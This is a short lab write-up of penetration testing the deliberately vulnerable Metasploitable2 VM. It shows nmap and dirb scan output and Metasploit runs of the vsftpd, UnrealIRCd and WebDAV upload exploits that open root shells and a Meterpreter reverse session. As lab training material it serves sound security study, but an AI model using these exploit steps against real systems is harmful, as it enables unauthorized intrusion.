Metasploitable2 has so many holes I lost interest part way....  These are the notes I cam up with along the way.

Reconnaissance:

First I need to find the box.

nmap -sS -O 192.168.118.0/24

192.168.118.177 looks guilty....being that this is the only other machine on the private VM network and there is a ton of services.

Enumeration:

I have a feeling there is going to be a ton of vulnerable services.

nmap:

root@kali:~# nmap -A -T4 192.168.118.177
Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-18 20:18 EDT
Nmap scan report for 192.168.118.177
Host is up (0.00042s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2017-05-19T00:18:24+00:00; 0s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
53/tcp   open  domain      ISC BIND 9.4.2
| dns-nsid:
|_  bind.version: 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      35631/tcp  mountd
|   100005  1,2,3      47913/udp  mountd
|   100021  1,3,4      46354/udp  nlockmgr
|   100021  1,3,4      59753/tcp  nlockmgr
|   100024  1          39255/udp  status
|_  100024  1          46286/tcp  status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    Java RMI Registry
1524/tcp open  shell       Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info:
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 8
|   Capabilities flags: 43564
|   Some Capabilities: ConnectWithDatabase, Support41Auth, SupportsTransactions, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, SupportsCompression, LongColumnFlag
|   Status: Autocommit
|_  Salt: );+gGmna|j"eZpGQ?)L'
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2017-05-19T00:18:24+00:00; 0s from scanner time.
5900/tcp open  vnc         VNC (protocol 3.3)
| vnc-info:
|   Protocol version: 3.3
|   Security types:
|_    VNC Authentication (2)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
MAC Address: 00:0C:29:A4:32:03 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP\x00
|_  System time: 2017-05-18T20:18:24-04:00

TRACEROUTE
HOP RTT     ADDRESS
1   0.43 ms 192.168.118.177

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.27 seconds


dirb scan:

root@kali:~# dirb http://192.168.118.177

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu May 18 21:57:30 2017
URL_BASE: http://192.168.118.177/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.118.177/ ----
+ http://192.168.118.177/cgi-bin/ (CODE:403|SIZE:296)                                                                  
==> DIRECTORY: http://192.168.118.177/dav/                                                                             
+ http://192.168.118.177/index (CODE:200|SIZE:891)                                                                     
+ http://192.168.118.177/index.php (CODE:200|SIZE:891)                                                                 
+ http://192.168.118.177/phpinfo (CODE:200|SIZE:48107)                                                                 
+ http://192.168.118.177/phpinfo.php (CODE:200|SIZE:48119)                                                             
==> DIRECTORY: http://192.168.118.177/phpMyAdmin/                                                                      
+ http://192.168.118.177/server-status (CODE:403|SIZE:301)                                                             
==> DIRECTORY: http://192.168.118.177/test/                                                                            
==> DIRECTORY: http://192.168.118.177/twiki/                                                                           

---- Entering directory: http://192.168.118.177/dav/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.177/phpMyAdmin/ ----
+ http://192.168.118.177/phpMyAdmin/calendar (CODE:200|SIZE:4145)                                                      
+ http://192.168.118.177/phpMyAdmin/changelog (CODE:200|SIZE:74593)                                                    
+ http://192.168.118.177/phpMyAdmin/ChangeLog (CODE:200|SIZE:40540)                                                    
==> DIRECTORY: http://192.168.118.177/phpMyAdmin/contrib/                                                              
+ http://192.168.118.177/phpMyAdmin/docs (CODE:200|SIZE:4583)                                                          
+ http://192.168.118.177/phpMyAdmin/error (CODE:200|SIZE:1063)                                                         
+ http://192.168.118.177/phpMyAdmin/export (CODE:200|SIZE:4145)                                                        
+ http://192.168.118.177/phpMyAdmin/favicon.ico (CODE:200|SIZE:18902)                                                  
+ http://192.168.118.177/phpMyAdmin/import (CODE:200|SIZE:4145)                                                        
+ http://192.168.118.177/phpMyAdmin/index (CODE:200|SIZE:4145)                                                         
+ http://192.168.118.177/phpMyAdmin/index.php (CODE:200|SIZE:4145)                                                     
==> DIRECTORY: http://192.168.118.177/phpMyAdmin/js/                                                                   
==> DIRECTORY: http://192.168.118.177/phpMyAdmin/lang/                                                                 
==> DIRECTORY: http://192.168.118.177/phpMyAdmin/libraries/                                                            
+ http://192.168.118.177/phpMyAdmin/license (CODE:200|SIZE:18011)                                                      
+ http://192.168.118.177/phpMyAdmin/LICENSE (CODE:200|SIZE:18011)                                                      
+ http://192.168.118.177/phpMyAdmin/main (CODE:200|SIZE:4227)                                                          
+ http://192.168.118.177/phpMyAdmin/navigation (CODE:200|SIZE:4145)                                                    
+ http://192.168.118.177/phpMyAdmin/phpinfo (CODE:200|SIZE:0)                                                          
+ http://192.168.118.177/phpMyAdmin/phpinfo.php (CODE:200|SIZE:0)                                                      
+ http://192.168.118.177/phpMyAdmin/phpmyadmin (CODE:200|SIZE:21389)                                                   
+ http://192.168.118.177/phpMyAdmin/print (CODE:200|SIZE:1063)                                                         
+ http://192.168.118.177/phpMyAdmin/readme (CODE:200|SIZE:2624)                                                        
+ http://192.168.118.177/phpMyAdmin/README (CODE:200|SIZE:2624)                                                        
+ http://192.168.118.177/phpMyAdmin/robots (CODE:200|SIZE:26)                                                          
+ http://192.168.118.177/phpMyAdmin/robots.txt (CODE:200|SIZE:26)                                                      
==> DIRECTORY: http://192.168.118.177/phpMyAdmin/scripts/                                                              
==> DIRECTORY: http://192.168.118.177/phpMyAdmin/setup/                                                                
+ http://192.168.118.177/phpMyAdmin/sql (CODE:200|SIZE:4145)                                                           
==> DIRECTORY: http://192.168.118.177/phpMyAdmin/test/                                                                 
==> DIRECTORY: http://192.168.118.177/phpMyAdmin/themes/                                                               
+ http://192.168.118.177/phpMyAdmin/TODO (CODE:200|SIZE:235)                                                           
+ http://192.168.118.177/phpMyAdmin/webapp (CODE:200|SIZE:6902)                                                        

---- Entering directory: http://192.168.118.177/test/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.177/twiki/ ----
==> DIRECTORY: http://192.168.118.177/twiki/bin/                                                                       
+ http://192.168.118.177/twiki/data (CODE:403|SIZE:298)                                                                
+ http://192.168.118.177/twiki/index (CODE:200|SIZE:782)                                                               
+ http://192.168.118.177/twiki/index.html (CODE:200|SIZE:782)                                                          
==> DIRECTORY: http://192.168.118.177/twiki/lib/                                                                       
+ http://192.168.118.177/twiki/license (CODE:200|SIZE:19440)                                                           
==> DIRECTORY: http://192.168.118.177/twiki/pub/                                                                       
+ http://192.168.118.177/twiki/readme (CODE:200|SIZE:4334)                                                             
+ http://192.168.118.177/twiki/templates (CODE:403|SIZE:303)                                                           

---- Entering directory: http://192.168.118.177/phpMyAdmin/contrib/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.177/phpMyAdmin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.177/phpMyAdmin/lang/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.177/phpMyAdmin/libraries/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.177/phpMyAdmin/scripts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.177/phpMyAdmin/setup/ ----
+ http://192.168.118.177/phpMyAdmin/setup/config (CODE:303|SIZE:1370)                                                  
==> DIRECTORY: http://192.168.118.177/phpMyAdmin/setup/frames/                                                         
+ http://192.168.118.177/phpMyAdmin/setup/index (CODE:200|SIZE:8619)                                                   
+ http://192.168.118.177/phpMyAdmin/setup/index.php (CODE:200|SIZE:8627)                                               
==> DIRECTORY: http://192.168.118.177/phpMyAdmin/setup/lib/                                                            
+ http://192.168.118.177/phpMyAdmin/setup/scripts (CODE:200|SIZE:21967)                                                
+ http://192.168.118.177/phpMyAdmin/setup/styles (CODE:200|SIZE:6218)                                                  

---- Entering directory: http://192.168.118.177/phpMyAdmin/test/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.177/phpMyAdmin/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.177/twiki/bin/ ----
+ http://192.168.118.177/twiki/bin/attach (CODE:200|SIZE:4362)                                                         
+ http://192.168.118.177/twiki/bin/changes (CODE:200|SIZE:21791)                                                       
+ http://192.168.118.177/twiki/bin/edit (CODE:200|SIZE:5351)                                                           
+ http://192.168.118.177/twiki/bin/manage (CODE:302|SIZE:0)                                                            
+ http://192.168.118.177/twiki/bin/passwd (CODE:302|SIZE:0)                                                            
+ http://192.168.118.177/twiki/bin/preview (CODE:302|SIZE:0)                                                           
+ http://192.168.118.177/twiki/bin/register (CODE:302|SIZE:0)                                                          
+ http://192.168.118.177/twiki/bin/save (CODE:302|SIZE:0)                                                              
+ http://192.168.118.177/twiki/bin/search (CODE:200|SIZE:3554)                                                         
+ http://192.168.118.177/twiki/bin/statistics (CODE:200|SIZE:1142)                                                     
+ http://192.168.118.177/twiki/bin/upload (CODE:302|SIZE:0)                                                            
+ http://192.168.118.177/twiki/bin/view (CODE:200|SIZE:10054)                                                          
+ http://192.168.118.177/twiki/bin/viewfile (CODE:302|SIZE:0)                                                          

---- Entering directory: http://192.168.118.177/twiki/lib/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.177/twiki/pub/ ----
+ http://192.168.118.177/twiki/pub/favicon.ico (CODE:200|SIZE:1078)                                                    
==> DIRECTORY: http://192.168.118.177/twiki/pub/Main/                                                                  

---- Entering directory: http://192.168.118.177/phpMyAdmin/setup/frames/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.177/phpMyAdmin/setup/lib/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.177/twiki/pub/Main/ ----

-----------------
END_TIME: Thu May 18 21:57:48 2017
DOWNLOADED: 32284 - FOUND: 56
root@kali:~#

EXPLOIT:

Wow...so lets start at the top.  Googling vsftpd 2.3.4 points us at a Metasplite page for an exploit.  Metasploitable2 is the name of the game.....so lets use msf!

vsftpd backdoor

msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  21               yes       The target port (TCP)
msf exploit(vsftpd_234_backdoor) > set rhost 192.168.118.177
rhost => 192.168.118.177
msf exploit(vsftpd_234_backdoor) > run

[*] 192.168.118.177:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.118.177:21 - USER: 331 Please specify the password.
[+] 192.168.118.177:21 - Backdoor service has been spawned, handling...
[+] 192.168.118.177:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.118.176:33109 -> 192.168.118.177:6200) at 2017-05-18 20:26:09 -0400

whoami
root

I'd bet $1 that the version of UnrealIRCD has a problem with it!  Lets blindly try the metasplite module.

msf auxiliary(mysql_login) > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit(unreal_ircd_3281_backdoor) > show options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  6667             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf exploit(unreal_ircd_3281_backdoor) > set rhost 192.168.118.177
rhost => 192.168.118.177
msf exploit(unreal_ircd_3281_backdoor) > run

[*] Started reverse TCP double handler on 192.168.118.176:4444
[*] 192.168.118.177:6667 - Connected to 192.168.118.177:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 192.168.118.177:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo WSELv6Yuu39Rd4M0;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "WSELv6Yuu39Rd4M0\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (192.168.118.176:4444 -> 192.168.118.177:45337) at 2017-05-18 20:49:18 -0400

whoami
root

root@kali:~# telnet 192.168.118.177 1524
Trying 192.168.118.177...
Connected to 192.168.118.177.
Escape character is '^]'.
root@metasploitable:/# whoami
root
root@metasploitable:/#


msf > use exploit/windows/http/xampp_webdav_upload_php
msf exploit(xampp_webdav_upload_php) > show options

Module options (exploit/windows/http/xampp_webdav_upload_php):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME                   no        The filename to give the payload. (Leave Blank for Random)
   PASSWORD  xampp            no        The HTTP password to specify for authentication
   PATH      /webdav/         yes       The path to attempt to upload
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                      yes       The target address
   RPORT     80               yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME  wampp            no        The HTTP username to specify for authentication
   VHOST                      no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(xampp_webdav_upload_php) > set path /dav/
path => /dav/
msf exploit(xampp_webdav_upload_php) > set rhost 192.168.118.177
rhost => 192.168.118.177
msf exploit(xampp_webdav_upload_php) > exploit

[*] Started reverse TCP handler on 192.168.118.176:4444
[*] Uploading Payload to /dav/O7pOf5A.php
[*] Attempting to execute Payload
[*] Sending stage (33986 bytes) to 192.168.118.177
[*] Meterpreter session 1 opened (192.168.118.176:4444 -> 192.168.118.177:59857) at 2017-05-18 22:02:48 -0400
meterpreter > shell
Process 5392 created.
Channel 0 created.
whoami
www-data
